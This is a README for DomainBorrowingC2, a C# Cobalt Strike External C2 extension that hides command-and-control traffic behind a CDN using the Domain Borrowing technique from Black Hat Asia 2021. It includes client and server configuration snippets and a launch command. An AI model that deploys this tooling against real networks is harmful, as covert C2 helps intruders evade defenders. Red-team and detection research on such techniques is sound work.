# DomainBorrowingC2

Domain Borrowing is a new method to hide C2 traffic using CDN. It was first presented at Blackhat Asia 2021 by [Junyu Zhou](https://twitter.com/md5_salt) and Tianze Ding. You can find the presentation slides [here](https://www.blackhat.com/asia-21/briefings/schedule/#domain-borrowing-catch-my-c-traffic-if-you-can-22314) and [here](https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-Ding-Domain-Borrowing-Catch-My-C2-Traffic-If-You-Can.pdf).

DomainBorrowingC2 is an extension for Cobalt Strike written in C# using Cobalt Strike's [External C2 spec](https://www.cobaltstrike.com/help-externalc2). It is based on [Ryan Hanson](https://twitter.com/ryhanson)'s [ExternalC2](https://github.com/ryhanson/ExternalC2) library and the [Covenant PoC](https://github.com/Dliv3/DomainBorrowing) provided in the Blackhat Asia 2021 slides.

## ClientC2
The ClientC2 project is responsible for connecting to the CDN and requesting a stager from ServerC2. It manages communications between Beacon and ServerC2.

Configuration for the client happens in `Program.cs`. The client takes 4 parameters:
1. domain or ip address to reach the CDN edge server(s)
2. the SNI
3. OPTIONAL port to communicate with the CDN, default port is 443
4. OPTIONAL sleep in milliseconds between messages, default is 60s

```csharp
Client client = new Client("target.domain.or.ip.address.here", "target.sni.here", 443, 60000);
```

## ServerC2
The ServerC2 project is responsible for relaying communications between the CDN and Cobalt Strike's Teamserver via the ExternalC2 socket.

Configuration for the server happens in `SocketSettings.cs`. Specify Cobalt Strike's ExternalC2 listener address and port here.

```csharp
public SocketSettings()
{
    IpAddress = "127.0.0.1";
    Port = "2222";
}
```

Launch the server with: `sudo dotnet run --url http://127.0.0.1:80/`. You can customize the IP and port to your liking and configure your CDN appropriately.

## Known issues

* ServerC2 currently depends on ClientC2, so make sure to copy the ClientC2 project before running ServerC2.
* This PoC will not be enhanced or updated at the moment due to possible IP conflicts, however you're free to submit a pull request and add features or functionality.